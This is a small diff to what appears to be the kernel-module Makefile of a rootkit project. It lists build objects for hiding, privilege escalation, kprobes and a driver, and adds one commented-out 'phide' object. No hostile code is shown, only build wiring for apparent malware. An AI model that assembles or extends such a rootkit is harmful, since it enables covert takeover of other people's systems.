@@ -24,6 +24,7 @@ obj-m += $(ROOTKIT).o
 
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/init.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/hide.o
+# $(ROOTKIT)-y += $(ROOTKIT_DIR)/phide.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/privesc.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/kprobe.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/driver.o
